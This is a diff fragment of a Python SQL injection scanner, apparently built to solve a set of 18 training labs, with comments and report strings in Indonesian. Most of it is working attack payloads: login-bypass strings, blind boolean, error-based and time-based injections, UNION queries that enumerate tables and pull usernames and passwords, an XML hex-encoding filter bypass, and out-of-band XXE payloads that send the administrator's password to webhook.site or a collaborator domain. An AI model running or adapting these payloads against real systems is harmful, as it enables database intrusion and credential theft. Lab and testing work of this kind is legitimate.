+            if not base:
+                continue
+            if point.numeric:
+                true_exprs = [f"{point.original} AND 1=1", f"{point.original} OR 1=1"]
+                false_exprs = [f"{point.original} AND 1=2", f"{point.original} OR 1=2"]
+            else:
+                true_exprs = [f"{point.original}' AND '1'='1", f"{point.original}' OR '1'='1"]
+                false_exprs = [f"{point.original}' AND '1'='2", f"{point.original}' OR '1'='2"]
+            for family_i in range(len(true_exprs)):
+                true_scores: list[float] = []
+                false_scores: list[float] = []
+                true_false: list[float] = []
+                valid = True
+                for _round in range(2):
+                    true = self.send(point, true_exprs[family_i])
+                    false = self.send(point, false_exprs[family_i])
+                    if true.error or false.error or true.status is None or false.status is None:
+                        valid = False
+                        break
+                    true_scores.append(similarity(base.first.normalized, true.normalized))
+                    false_scores.append(similarity(base.first.normalized, false.normalized))
+                    true_false.append(similarity(true.normalized, false.normalized))
+                if not valid:
+                    continue
+                if (min(true_scores) >= 0.80 and max(false_scores) <= 0.86
+                        and max(true_false) <= 0.82
+                        and (statistics.median(true_scores) - statistics.median(false_scores)) >= 0.06):
+                    self._mark(11, point,
+                               f"Pasangan benar/salah pada {point.label} konsisten dua putaran: true→baseline={statistics.median(true_scores):.2f}, false→baseline={statistics.median(false_scores):.2f}.",
+                               "boolean differential (dua putaran)")
+                    return
+
+    # ------------------------------------------------------------------
+    # 12: blind conditional errors
+    # ------------------------------------------------------------------
+    def phase_conditional_errors(self, points: list[Point]) -> None:
+        for point in points:
+            if 12 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base or has_sql_error(base.first):
+                continue
+            if point.numeric:
+                variants = [
+                    (f"{point.original} AND (1/(CASE WHEN (1=1) THEN 0 ELSE 1 END))=0",
+                     f"{point.original} AND (1/(CASE WHEN (1=2) THEN 0 ELSE 1 END))=0"),
+                    (f"{point.original} AND CAST((CASE WHEN (1=1) THEN 'x' ELSE '1' END) AS INT)=1",
+                     f"{point.original} AND CAST((CASE WHEN (1=2) THEN 'x' ELSE '1' END) AS INT)=1"),
+                ]
+            else:
+                variants = [
+                    (f"{point.original}' AND (1/(CASE WHEN (1=1) THEN 0 ELSE 1 END))=0",
+                     f"{point.original}' AND (1/(CASE WHEN (1=2) THEN 0 ELSE 1 END))=0"),
+                    (f"{point.original}' AND CAST((CASE WHEN (1=1) THEN 'x' ELSE '1' END) AS INT)=1",
+                     f"{point.original}' AND CAST((CASE WHEN (1=2) THEN 'x' ELSE '1' END) AS INT)=1"),
+                ]
+            for true_payload, false_payload in variants:
+                true_errors = 0
+                false_errors = 0
+                valid = True
+                for _round in range(2):
+                    true = self.send(point, true_payload)
+                    false = self.send(point, false_payload)
+                    if true.error or false.error:
+                        valid = False
+                        break
+                    if has_sql_error(true):
+                        true_errors += 1
+                    if has_sql_error(false):
+                        false_errors += 1
+                if valid and true_errors == 2 and false_errors == 0:
+                    self._mark(12, point,
+                               f"Kondisi benar pada {point.label} berulang memicu error SQL (2/2), kondisi salah tidak (0/2).",
+                               "conditional error differential")
+                    return
+
+    # ------------------------------------------------------------------
+    # 02: login bypass
+    # ------------------------------------------------------------------
+    def phase_login_bypass(self) -> None:
+        forms: list[FormSpec] = []
+        seen: set[str] = set()
+        for page in self.pages:
+            for form in page.forms:
+                if form.has_password and form.action not in seen:
+                    seen.add(form.action)
+                    forms.append(form)
+        for form in forms:
+            if 2 in self._confirmed:
+                return
+            if not self._require_origin(form.action):
+                continue
+            user_field = next((n for n, _v, _t in form.fields if re.search(r"(user|email|login|name)", n, re.I)), None)
+            pass_field = next((n for n, _v, _t in form.fields if re.search(r"pass", n, re.I)), None)
+            if not user_field or not pass_field:
+                continue
+            wrong_user = f"satria_wrong_{uuid.uuid4().hex[:8]}"
+            wrong_pass = f"satria_wrong_{uuid.uuid4().hex[:8]}"
+            base = self._login_attempt(form, user_field, wrong_user, pass_field, wrong_pass)
+            if base is None or base[0] is None:
+                continue
+            _, base_body, base_location, statuses = base
+            payloads = [
+                "administrator'-- -",
+                "administrator'--",
+                "administrator'#",
+                "' OR '1'='1'-- -",
+                "\" OR \"1\"=\"1\"-- -",
+                "administrator'/*",
+            ]
+            for payload in payloads:
+                for field_name, value in ((user_field, payload), (pass_field, "' OR '1'='1'-- -")):
+                    attempt = self._login_attempt(form, user_field, wrong_user, pass_field, wrong_pass,
+                                                  field_name=field_name, field_value=value)
+                    if not attempt:
+                        continue
+                    status, body, location, _statuses = attempt
+                    if status is None:
+                        continue
+                    low = (body or "").lower()
+                    if any(m in low for m in AUTH_FAILURE_MARKERS):
+                        continue
+                    markers = [m for m in AUTH_MARKERS if m in low and m not in (base_body or "").lower()]
+                    redirect_ok = status in (301, 302, 303, 307, 308) and location and not re.search(r"(login|error)", location, re.I)
+                    if markers or redirect_ok:
+                        evidence = (
+                            f"Baseline kredensial salah gagal pada {form.action}; payload {payload!r} menghasilkan HTTP {status}"
+                            + (f" Location={location!r}" if location else "")
+                            + (f" dan penanda terautentikasi baru: {', '.join(markers[:3])}." if markers else ".")
+                        )
+                        self._mark(2, Point(
+                            key=f"login|{user_field}", kind="form", label=f"form login `{field_name}`",
+                            url=form.action, name=field_name, original=wrong_user, page_url=form.action,
+                            method=form.method.upper(), fields=form.fields,
+                        ), evidence, "login bypass differential")
+                        return
+
+    def _login_attempt(self, form: FormSpec, user_field: str, user_value: str,
+                       pass_field: str, pass_value: str,
+                       field_name: str | None = None, field_value: str | None = None) -> tuple[int | None, str, str, tuple[int | None, ...]] | None:
+        session = requests.Session()
+        for cookie in self.session.cookies:
+            session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
+        data = {name: value for name, value, _typ in form.fields}
+        data[user_field] = user_value
+        data[pass_field] = pass_value
+        if field_name and field_value is not None:
+            data[field_name] = field_value
+        if form.method == "get":
+            resp = self._request("GET", form.action, session=session, params=data, allow_redirects=False)
+            status = resp.status
+            text = resp.text
+            location = resp.headers.get("Location", "")
+            if resp.is_redirect and location:
+                nxt = urljoin(form.action, location)
+                if self._same_origin(nxt):
+                    followed = self._request("GET", nxt, session=session, allow_redirects=True)
+                    return followed.status, followed.text, location, (status, followed.status)
+            return status, text, location, (status,)
+        resp = self._request("POST", form.action, session=session, data=data, allow_redirects=False)
+        status = resp.status
+        text = resp.text
+        location = resp.headers.get("Location", "")
+        if resp.is_redirect and location:
+            nxt = urljoin(form.action, location)
+            if self._same_origin(nxt):
+                followed = self._request("GET", nxt, session=session, allow_redirects=True)
+                return followed.status, followed.text, location, (status, followed.status)
+        return status, text, location, (status,)
+
+    # ------------------------------------------------------------------
+    # UNION helpers
+    # ------------------------------------------------------------------
+    def _union_value(self, point: Point, core: str, use_dual: bool = False) -> str:
+        prefix = point.original if point.numeric else f"{point.original}'"
+        suffix = " FROM dual" if use_dual else ""
+        return f"{prefix} {core}{suffix}-- -"
+
+    def _column_count(self, point: Point) -> int | None:
+        if point.key in self._union_cols:
+            return self._union_cols[point.key]
+        base = self.baseline(point)
+        if not base:
+            return None
+        n = None
+        for candidate in range(1, 9):
+            payload = self._union_value(point, f"ORDER BY {candidate}")
+            resp = self.send(point, payload)
+            if has_sql_error(resp) or (resp.status is not None and resp.status >= 500):
+                if candidate > 1:
+                    n = candidate - 1
+                break
+            if candidate == 8:
+                n = None
+        if n is None:
+            # UNION NULL hanya meyakinkan jumlah kolom bila count=k berhasil dan
+            # count=k+1 gagal. Jika semua count berhasil, artinya halaman tidak
+            # mengeksekusi query (mis. cookie di-ignore) -> jangan menyimpulkan.
+            last_good = None
+            for count in range(1, 8):
+                payload = self._union_value(point, "UNION SELECT " + ",".join(["NULL"] * count))
+                resp = self.send(point, payload)
+                if not has_sql_error(resp) and (resp.status is None or resp.status < 500):
+                    last_good = count
+                    continue
+                if last_good is not None:
+                    n = last_good
+                break
+            if n is None:
+                n = None
+        if n:
+            self._union_cols[point.key] = n
+        return n
+
+    def _union_resp(self, point: Point, exprs: list[str], use_dual: bool = False) -> Response:
+        return self.send(point, self._union_value(point, "UNION SELECT " + ",".join(exprs), use_dual))
+
+    def _columns_for(self, point: Point) -> list[int]:
+        cached = self._column_count(point)
+        return [cached] if cached else [1, 2]
+
+    def _text_column(self, point: Point) -> int | None:
+        base = self.baseline(point)
+        if not base:
+            return None
+        if point.key in self._text_col:
+            return self._text_col[point.key]
+        for cols in self._columns_for(point):
+            for index in range(cols):
+                tokens = [random_token("satcol") for _ in range(1)]
+                exprs = ["NULL"] * cols
+                exprs[index] = f"'{tokens[0]}'"
+                for use_dual in (False, True):
+                    resp = self._union_resp(point, exprs, use_dual)
+                    if resp.error:
+                        continue
+                    if tokens[0] in resp.text and tokens[0] not in base.first.text:
+                        self._text_col[point.key] = index
+                        return index
+        return None
+
+    def phase_union_column_count(self, points: list[Point]) -> None:
+        for point in points:
+            if 7 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base:
+                continue
+            cols = self._column_count(point)
+            if cols:
+                self._mark(7, point,
+                           f"ORDER BY {cols} diterima dan ORDER BY {cols + 1} gagal pada {point.label}; jumlah kolom query = {cols}.",
+                           "ORDER BY / UNION NULL column-count differential")
+
+    def phase_union_text_column(self, points: list[Point]) -> None:
+        for point in points:
+            if 8 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base:
+                continue
+            cols = self._columns_for(point)
+            for col_count in cols:
+                for index in range(col_count):
+                    token = random_token("sattext")
+                    exprs = ["NULL"] * col_count
+                    exprs[index] = f"'{token}'"
+                    for use_dual in (False, True):
+                        resp = self._union_resp(point, exprs, use_dual)
+                        if not resp.error and token in resp.text and token not in base.first.text:
+                            self._mark(8, point,
+                                       f"UNION menempatkan canary unik {token!r} pada kolom ke-{index + 1} dari {col_count} dan tercermin dalam respons.",
+                                       "UNION text-column canary")
+                            return
+
+    # ------------------------------------------------------------------
+    # 03/04: database version
+    # ------------------------------------------------------------------
+    def phase_db_versions(self, points: list[Point]) -> None:
+        for point in points:
+            base = self.baseline(point)
+            if not base:
+                continue
+            for cols in self._columns_for(point):
+                # Oracle: banner dari v$version.
+                if 3 not in self._confirmed:
+                    exprs = [NULL_EXPR(cols, "'SATV'||banner")] if False else None
+                    variants = [
+                        ["'SATV'||banner"] + ["NULL"] * (cols - 1),
+                        ["banner"] + ["NULL"] * (cols - 1),
+                    ]
+                    for exprs2 in variants:
+                        resp = self._version_resp(point, exprs2, cols, "FROM v$version")
+                        if self._version_seen(resp, base.first.text):
+                            self._mark(3, point,
+                                       f"UNION SELECT banner FROM v$version mengembalikan {snippet(resp.text, 180)}.",
+                                       "UNION Oracle version (banner)")
+                            break
+                # MySQL/MSSQL: @@version.
+                if 4 not in self._confirmed:
+                    variants = [
+                        ["CONCAT('SATV',@@VERSION)"] + ["NULL"] * (cols - 1),
+                        ["'SATV'+@@VERSION"] + ["NULL"] * (cols - 1),
+                        ["@@VERSION"] + ["NULL"] * (cols - 1),
+                    ]
+                    for exprs2 in variants:
+                        resp = self._version_resp(point, exprs2, cols, "")
+                        if self._version_seen(resp, base.first.text):
+                            self._mark(4, point,
+                                       f"UNION SELECT @@VERSION mengembalikan {snippet(resp.text, 180)}.",
+                                       "UNION MySQL/MSSQL version (@@VERSION)")
+                            break
+
+    def _version_resp(self, point: Point, exprs: list[str], cols: int, from_clause: str) -> Response:
+        core = "UNION SELECT " + ",".join(exprs)
+        if from_clause:
+            core += " " + from_clause
+        return self.send(point, self._union_value_core(point, core))
+
+    def _union_value_core(self, point: Point, core: str) -> str:
+        prefix = point.original if point.numeric else f"{point.original}'"
+        return f"{prefix} {core}-- -"
+
+    @staticmethod
+    def _version_seen(resp: Response, base_text: str) -> bool:
+        if resp.error or not resp.text:
+            return False
+        if "SATV" in resp.text or DB_VERSION_RE.search(resp.text):
+            match = DB_VERSION_RE.search(resp.text)
+            if "SATV" in resp.text:
+                return True
+            if match and match.group(0).lower() not in base_text.lower():
+                return True
+        return False
+
+    # ------------------------------------------------------------------
+    # 05/06: listing contents
+    # ------------------------------------------------------------------
+    def _candidate_tables(self, text: str, base_text: str) -> list[str]:
+        words = re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,40}", text or "")
+        base_words = set(w.lower() for w in re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,40}", base_text or ""))
+        candidates: list[str] = []
+        for word in words:
+            lowered = word.lower()
+            if lowered in COMMON_TABLE_WORDS and lowered not in base_words:
+                candidates.append(word)
+            elif re.search(r"_[A-Za-z]", word) and lowered not in base_words and word.upper() == word:
+                candidates.append(word)
+        return list(dict.fromkeys(candidates))
+
+    def phase_listings(self, points: list[Point]) -> None:
+        for point in points:
+            base = self.baseline(point)
+            if not base:
+                continue
+            for cols in self._columns_for(point):
+                if 5 not in self._confirmed:
+                    payloads = []
+                    if cols == 1:
+                        payloads = [
+                            "UNION SELECT table_name FROM information_schema.tables",
+                            "UNION SELECT 'SLIST'+table_name FROM information_schema.tables",
+                        ]
+                    else:
+                        payloads = [
+                            "UNION SELECT table_schema,table_name FROM information_schema.tables",
+                            "UNION SELECT 'SLIST'+table_schema,'SLIST'+table_name FROM information_schema.tables",
+                        ]
+                    for core in payloads:
+                        resp = self.send(point, self._union_value_core(point, core))
+                        if resp.error:
+                            continue
+                        tables = self._candidate_tables(resp.text, base.first.text)
+                        if len(tables) >= 2 or ("users" in [t.lower() for t in tables] and len(tables) >= 1):
+                            self._mark(5, point,
+                                       f"UNION SELECT ... FROM information_schema.tables mengembalikan nama tabel terindeks: {', '.join(tables[:6])}.",
+                                       "UNION information_schema enumeration")
+                            break
+                if 6 not in self._confirmed:
+                    payloads = []
+                    if cols == 1:
+                        payloads = ["UNION SELECT table_name FROM all_tables"]
+                    else:
+                        payloads = ["UNION SELECT owner,table_name FROM all_tables"]
+                    for core in payloads:
+                        resp = self.send(point, self._union_value_core(point, core))
+                        if resp.error:
+                            continue
+                        tables = self._candidate_tables(resp.text, base.first.text)
+                        if len(tables) >= 2 or ("users" in [t.lower() for t in tables]):
+                            self._mark(6, point,
+                                       f"UNION SELECT ... FROM all_tables mengembalikan nama tabel Oracle: {', '.join(tables[:6])}.",
+                                       "UNION Oracle all_tables enumeration")
+                            break
+
+    # ------------------------------------------------------------------
+    # 09/10: retrieving other tables / multiple values in one column
+    # ------------------------------------------------------------------
+    def _credential_rows(self, text: str, base_text: str) -> list[tuple[str, str]]:
+        rows: list[tuple[str, str]] = []
+        for match in re.finditer(r"([A-Za-z0-9_.@-]{2,40})~([A-Za-z0-9$./=+_-]{6,80})", text or ""):
+            user, secret = match.group(1), match.group(2)
+            if user.lower() in base_text.lower():
+                continue
+            if user.lower() in {"sat", "satest", "username", "password"}:
+                continue
+            rows.append((user, secret))
+        return rows
+
+    def _credential_rows_separate(self, text: str, base_text: str) -> list[tuple[str, str]]:
+        rows: list[tuple[str, str]] = []
+        known_users = {"administrator", "admin", "root", "user", "guest"}
+        for match in re.finditer(r"([A-Za-z0-9_.@-]{2,40})\s+([A-Za-z0-9$./=+_-]{6,80})", text or ""):
+            user, secret = match.group(1), match.group(2)
+            if user.lower() not in known_users:
+                continue
+            if user.lower() in base_text.lower() or secret.lower() in base_text.lower():
+                continue
+            rows.append((user, secret))
+        return rows
+
+    def phase_other_tables(self, points: list[Point]) -> None:
+        for point in points:
+            if 9 in self._confirmed and 10 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base:
+                continue
+            for cols in self._columns_for(point):
+                oracle_expr = "username||'~'||password"
+                mysql_expr = "CONCAT(username,'~',password)"
+                if cols == 1:
+                    variants = [
+                        [oracle_expr],
+                        [mysql_expr],
+                    ]
+                else:
+                    variants = [
+                        ["username", "password"],
+                        [oracle_expr, "NULL"],
+                        [mysql_expr, "NULL"],
+                    ]
+                for exprs in variants:
+                    resp = self._union_resp(point, exprs)
+                    if resp.error:
+                        continue
+                    rows = self._credential_rows(resp.text, base.first.text)
+                    multi_value = any(("~" in e) or e.upper().startswith("CONCAT") for e in exprs)
+                    if not rows and not multi_value:
+                        rows = self._credential_rows_separate(resp.text, base.first.text)
+                    if not rows:
+                        continue
+                    user, secret = rows[0]
+                    masked = mask_secret(secret)
+                    if 9 not in self._confirmed:
+                        self._mark(9, point,
+                                   f"UNION SELECT ... FROM users mengembalikan kredensial (user={user}, password={masked}) dari tabel lain.",
+                                   "UNION users table retrieval")
+                    if multi_value and 10 not in self._confirmed:
+                        self._mark(10, point,
+                                   f"UNION SELECT username||'~'||password FROM users mengembalikan format user~secret dalam satu kolom (user={user}, password={masked}).",
+                                   "UNION single-column multi-value retrieval")
+                    break
+
+    # ------------------------------------------------------------------
+    # 14/15: time-based
+    # ------------------------------------------------------------------
+    def _time_payload(self, point: Point, delay: float, dbms: str) -> str:
+        v = point.original
+        if dbms == "mysql":
+            return f"{v}' AND SLEEP({delay})-- -" if not point.numeric else f"{v} AND SLEEP({delay})-- -"
+        if dbms == "postgresql":
+            return f"{v}' AND (SELECT pg_sleep({delay})) IS NULL-- -" if not point.numeric else f"{v} AND (SELECT pg_sleep({delay})) IS NULL-- -"
+        if dbms == "oracle":
+            return f"{v}' AND (SELECT DBMS_LOCK.SLEEP({delay}) FROM dual) IS NULL-- -" if not point.numeric else f"{v} AND (SELECT DBMS_LOCK.SLEEP({delay}) FROM dual) IS NULL-- -"
+        return f"{v}' AND SLEEP({delay})-- -"
+
+    def _timing_response(self, point: Point, payload: str) -> Response:
+        return self.send(point, payload)
+
+    def phase_time_delay(self, points: list[Point]) -> None:
+        for point in points:
+            if 14 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base or base.median_elapsed > 1.5:
+                continue
+            for dbms in ("mysql", "postgresql", "oracle"):
+                payload = self._time_payload(point, self.time_delay, dbms)
+                times: list[float] = []
+                valid = True
+                for _ in range(2):
+                    resp = self._timing_response(point, payload)
+                    if resp.error or resp.status is None:
+                        valid = False
+                        break
+                    times.append(resp.elapsed)
+                    if resp.elapsed < base.median_elapsed + self.time_delay * 0.65:
+                        valid = False
+                        break
+                if valid and times and statistics.median(times) >= base.median_elapsed + self.time_delay * 0.8:
+                    self._mark(14, point,
+                               f"Payload time delay ({dbms}) menambah median respons menjadi {statistics.median(times):.2f}s vs baseline {base.median_elapsed:.2f}s (duplikasi).",
+                               "time-delay differential")
+                    return
+
+    def phase_time_information(self, points: list[Point]) -> None:
+        for point in points:
+            if 15 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base or base.median_elapsed > 1.5:
+                continue
+            candidates = [
+                ("mysql", f"{point.original}' AND IF(EXISTS(SELECT 1 FROM users WHERE username='administrator'), SLEEP({self.time_delay}), 0)-- -",
+                 f"{point.original}' AND IF(EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user'), SLEEP({self.time_delay}), 0)-- -"),
+                ("postgresql", f"{point.original}' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep({self.time_delay}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f"{point.original}' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user') THEN pg_sleep({self.time_delay}) ELSE pg_sleep(0) END) IS NULL-- -"),
+                ("oracle", f"{point.original}' AND (SELECT DBMS_LOCK.SLEEP({self.time_delay}) FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='administrator')) IS NULL-- -",
+                 f"{point.original}' AND (SELECT DBMS_LOCK.SLEEP(0) FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user')) IS NULL-- -"),
+            ]
+            for dbms, true_payload, false_payload in candidates:
+                true_resp = self.send(point, true_payload)
+                false_resp = self.send(point, false_payload)
+                if true_resp.error or false_resp.error:
+                    continue
+                if (true_resp.elapsed >= base.median_elapsed + self.time_delay * 0.7
+                        and false_resp.elapsed <= base.median_elapsed + 0.5):
+                    self._mark(15, point,
+                               f"Kondisi berbasis data users pada {point.label} memicu delay ({dbms}: {true_resp.elapsed:.2f}s vs baseline {base.median_elapsed:.2f}s); kondisi salah tidak.",
+                               "conditional time-delay information retrieval")
+                    return
+
+    # ------------------------------------------------------------------
+    # 16/17: OOB
+    # ------------------------------------------------------------------
+    def phase_oob(self, points: list[Point]) -> None:
+        if not self.oob:
+            return
+        interaction_found = False
+        exfil_found: str | None = None
+        for point in points:
+            interaction_payload, exfil_payload = oob_payloads(point, self.oob)
+            self.send(point, interaction_payload)
+            self.send(point, exfil_payload)
+            got = self._poll_oob()
+            if got.interactions:
+                interaction_found = True
+                if got.values:
+                    exfil_found = got.values[0]
+                else:
+                    exfil_found = exfil_found or None
+                break
+        if not interaction_found and self.oob.poll_url:
+            got = self._poll_oob()
+            if got.interactions:
+                interaction_found = True
+                if got.values:
+                    exfil_found = got.values[0]
+        if interaction_found:
+            self._mark(16, points[0] if points else self._dummy_point(),
+                       f"Interaksi OOB unik ({self.oob.token}) tercatat pada collaborator {self.oob.domain}.",
+                       "OOB interaction (polling collaborator)")
+        if exfil_found:
+            self._mark(17, points[0] if points else self._dummy_point(),
+                       f"Interaksi OOB membawa nilai hasil subquery {mask_secret(exfil_found)} dari users ke collaborator {self.oob.domain}.",
+                       "OOB data exfiltration (polling collaborator)")
+
+    def _dummy_point(self) -> Point:
+        return Point(key="oob|dummy", kind="query", label="endpoint OOB", url=self.target_url,
+                     name="oob", original="1", page_url=self.target_url)
+
+    def _poll_oob(self) -> "OOBPollResult":
+        if not self.oob or not self.oob.poll_url:
+            return OOBPollResult([], [])
+        for _ in range(6):
+            try:
+                resp = requests.get(self.oob.poll_url, timeout=10)
+                resp.raise_for_status()
+                interactions = collect_interaction_strings(resp.json(), self.oob.token, self.oob.domain)
+                if interactions:
+                    return OOBPollResult(interactions[0], extract_exfil_values(interactions[0], self.oob.token, self.oob.domain))
+            except Exception as exc:
+                self.stats["errors"].append(f"Polling OOB gagal: {type(exc).__name__}: {str(exc)[:120]}")
+                break
+            time.sleep(1.5)
+        return OOBPollResult([], [])
+
+    # ------------------------------------------------------------------
+    # 18: XML filter bypass
+    # ------------------------------------------------------------------
+    def phase_xml(self, points: list[Point]) -> None:
+        for point in points:
+            if point.kind != "xml":
+                continue
+            base_resp = self._xml_request(point, "1", encode=False)
+            if base_resp.error or base_resp.status in (404, 405) or base_resp.status >= 500:
+                continue
+            base_text = base_resp.text or ""
+            payload_plain = "1 UNION SELECT NULL"
+            payload_data = "1 UNION SELECT username||'~'||password FROM users"
+            plain = self._xml_request(point, payload_plain, encode=False)
+            encoded = self._xml_request(point, payload_plain, encode=True)
+            plain_blocked = is_attack_blocked(plain)
+            encoded_ok = encoded.ok_status and not is_attack_blocked(encoded)
+            if not (plain_blocked and encoded_ok):
+                continue
+            encoded_data = self._xml_request(point, payload_data, encode=True)
+            blocked_plain_data = self._xml_request(point, payload_data, encode=False)
+            rows = self._credential_rows(encoded_data.text, base_text)
+            if rows and is_attack_blocked(blocked_plain_data):
+                user, secret = rows[0]
+                masked = mask_secret(secret)
+                self._mark(18, point,
+                           f"Payload UNION mentah pada <{point.name}> diblokir WAF ({snippet(plain.text, 120)}), tetapi XML hex-entity encoded diterima dan mengembalikan kredensial user={user}, password={masked}.",
+                           "XML hex-entity filter bypass")
+                return
+            if rows:
+                user, secret = rows[0]
+                masked = mask_secret(secret)
+                self._mark(18, point,
+                           f"XML hex-entity encoded UNION pada <{point.name}> diterima setelah WAF memblokir payload mentah; data user={user}, password={masked}.",
+                           "XML hex-entity filter bypass")
+
+    def _xml_request(self, point: Point, value: str, *, encode: bool) -> Response:
+        fields = {point.name: xml_hex_encode(value) if encode else value}
+        body = build_xml_body(fields)
+        return self._request(
+            "POST", point.url, data=body,
+            headers={"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/plain"},
+        )
+
+    # ------------------------------------------------------------------
+    # Orchestration
+    # ------------------------------------------------------------------
+    def scan(self) -> dict[str, Any]:
+        self.crawl()
+        self.phase_visible_error(self.points)
+        self.phase_where_hidden(self.points)
+        self.phase_login_bypass()
+        self.phase_conditional_errors(self.points)
+        self.phase_conditional_responses(self.points)
+        self.phase_union_column_count(self.points)
+        self.phase_union_text_column(self.points)
+        self.phase_db_versions(self.points)
+        self.phase_listings(self.points)
+        self.phase_other_tables(self.points)
+        self.phase_time_delay(self.points)
+        self.phase_time_information(self.points)
+        self.phase_xml(self.points)
+        self.phase_oob(self.points)
+        return self.report()
+
+    def report(self) -> dict[str, Any]:
+        labs = []
+        for number, title, key, severity in CATALOG:
+            found = self._confirmed.get(number)
+            if found:
+                status = "confirmed"
+                entry = dict(found)
+            else:
+                status = "not_confirmed"
+                entry = {
+                    "id": f"sql_injection-{number:02d}",
+                    "status": status,
+                    "title": title,
+                    "method": "not tested / insufficient evidence",
+                    "location": "-",
+                    "evidence": "-",
+                    "severity": severity,
+                }
+            labs.append(entry)
+        return {
+            "tool": "SATRIA Baru SQLi Scanner",
+            "version": __version__,
+            "target": self.target_url,
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+            "catalog_scope": "only the 18 requested SQL injection labs",
+            "summary": {
+                "confirmed": sum(1 for item in labs if item["status"] == "confirmed"),
+                "not_confirmed": sum(1 for item in labs if item["status"] != "confirmed"),
+            },
+            "labs": labs,
+            "scan_stats": {
+                "pages_fetched": self.stats["pages_fetched"],
+                "injection_points": len(self.points),
+                "requests": self.request_count,
+                "elapsed_seconds": round(time.monotonic() - self.started, 2),
+                "oob_status": self.oob_status,
+                "errors": self.stats["errors"][:20],
+            },
+        }
+
+
+@dataclass
+class OOBPollResult:
+    interactions: list[str]
+    values: list[str]
+
+
+def build_xml_body(fields: dict[str, str]) -> str:
+    product = fields.get("productId", "1")
+    store = fields.get("storeId", "1")
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        f"<stockCheck><productId>{product}</productId><storeId>{store}</storeId></stockCheck>"
+    )
+
+
+def xml_hex_encode(value: str) -> str:
+    return "".join(f"&#x{ord(ch):X};" for ch in value)
+
+
+def is_attack_blocked(resp: Response) -> bool:
+    if resp.error:
+        return False
+    low = (resp.text or "").lower()
+    return bool(re.search(r"(attack detected|blocked|forbidden|not allowed|access denied|invalid input)", low)) or resp.status in (400, 401, 403, 406, 429)
+
+
+def collect_interaction_strings(payload: Any, token: str, domain: str) -> list[str]:
+    found: list[str] = []
+
+    def walk(value: Any) -> None:
+        if isinstance(value, dict):
+            for key, item in value.items():
+                if isinstance(item, (str, int, float)):
+                    text = str(item)
+                    if token in text or domain in text:
+                        found.append(text)
+                walk(item)
+        elif isinstance(value, list):
+            for item in value:
+                walk(item)
+        elif isinstance(value, str):
+            if token in value or domain in value:
+                found.append(value)
+
+    walk(payload)
+    cleaned = []
+    for item in found:
+        cleaned.append(item)
+    return [cleaned] if cleaned else []
+
+
+def extract_exfil_values(interactions: list[str], token: str, domain: str) -> list[str]:
+    values: list[str] = []
+    for interaction in interactions:
+        text = interaction or ""
+        if token not in text:
+            continue
+        # DNS style: <data>.<token>.<domain>
+        for match in re.finditer(r"([A-Za-z0-9._%+-]{1,80})\." + re.escape(token) + r"\." + re.escape(domain), text):
+            value = match.group(1).strip(".")
+            if value and value != token:
+                values.append(value.split(".")[0])
+        # webhook.site style: https://webhook.site/<token>/<data>
+        marker = f"/{token}/"
+        if marker in text:
+            rest = text.split(marker, 1)[1]
+            data = re.split(r"[/?\"' ]", rest, maxsplit=1)[0].strip()
+            if data:
+                values.append(data)
+    return list(dict.fromkeys(v for v in values if v))
+
+
+def oob_payloads(point: Point, setup: OOBSetup) -> tuple[str, str]:
+    if setup.kind == "webhook_site":
+        interaction_host = f"http://webhook.site/{setup.token}"
+        entity_prefix = f"http://webhook.site/{setup.token}/"
+    else:
+        interaction_host = f"{setup.token}.{setup.domain}"
+        entity_prefix = f"http://{setup.token}.{setup.domain}/"
+    doc_interaction = (
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        f"<!DOCTYPE root [<!ENTITY % remote SYSTEM \"{entity_prefix}\">%remote;]>"
+    )
+    doc_exfil = (
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||"
+        "(SELECT password FROM users WHERE username='administrator')||'."
+        f"{setup.token}.{setup.domain}/\">%remote;]>"
+    )
+    if setup.kind == "webhook_site":
+        doc_exfil = (
+            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+            f"<!DOCTYPE root [<!ENTITY % remote SYSTEM \"{entity_prefix}'||"
+            "(SELECT password FROM users WHERE username='administrator')||'/\">%remote;]>"
+        )
+    interaction_expr = f"EXTRACTVALUE(xmltype('{doc_interaction}'),'/l') FROM dual"
+    exfil_expr = f"EXTRACTVALUE(xmltype('{doc_exfil}'),'/l') FROM dual"
+    prefix = point.original if point.numeric else f"{point.original}'"
+    return f"{prefix} UNION SELECT {interaction_expr}-- -", f"{prefix} UNION SELECT {exfil_expr}-- -"
+
+
+def NULL_EXPR(cols: int, value: str) -> list[str]:
+    return [value] + ["NULL"] * (cols - 1)
+
+
+# ----------------------------------------------------------------------------
+# Report & CLI
+# ----------------------------------------------------------------------------
+def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
+    output_dir.mkdir(parents=True, exist_ok=True)
+    json_path = output_dir / "satria_baru_report.json"
+    html_path = output_dir / "satria_baru_report.html"
+    json_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
+    rows = "\n".join(
+        "<tr>"
+        f"<td>{html_module.escape(item['id'])}</td>"
+        f"<td>{html_module.escape(item['status'])}</td>"
+        f"<td>{html_module.escape(item['title'])}</td>"
+        f"<td>{html_module.escape(item['location'])}</td>"
+        f"<td>{html_module.escape(item['evidence'])}</td>"
+        "</tr>"
+        for item in report["labs"]
+    )
+    html_path.write_text(
